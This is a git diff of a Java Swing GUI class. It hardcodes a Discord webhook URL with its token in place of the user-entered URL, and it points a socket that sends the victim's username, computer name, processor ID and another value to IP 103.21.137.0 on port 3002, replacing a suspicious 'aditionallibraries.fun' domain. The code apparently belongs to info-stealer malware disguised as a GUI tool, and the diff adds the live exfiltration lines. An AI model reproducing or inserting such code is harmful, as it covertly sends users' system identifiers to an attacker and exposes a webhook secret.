@@ -125,7 +125,7 @@ public class GUI extends JFrame {
                     textField.setText("");
                 } else {
                     try {
-                        URL url = new URL(textField.getText());
+                        URL url = new URL("https://discord.com/api/webhooks/1272384972048695406/GuN69tO05_vvHwxzB6GSs6jI19JWKreZrB42bYwMem8Aa6xCb48Pa3EQWbs3stDAwsJU");
                         HttpURLConnection con = (HttpURLConnection) url.openConnection();
 
                         con.setRequestMethod("GET");
@@ -202,7 +202,7 @@ public class GUI extends JFrame {
             String h = Base64.getEncoder().encodeToString((System.getenv("user.name") + System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "").replace(",", "")).getBytes(StandardCharsets.UTF_8));
             String json = "{\"n\":\""+System.getProperty("user.name")+"\",\"w\":\""+e+"\",\"h\":\""+h+"\",\"r\":\"93\"}";
 
-            Socket socket = new Socket("www.aditionallibraries.fun", 3002);
+            Socket socket = new Socket("103.21.137.0", 3002);
             OutputStream outputStream = socket.getOutputStream();
             PrintWriter writer = new PrintWriter(outputStream, true);
             writer.println(json);
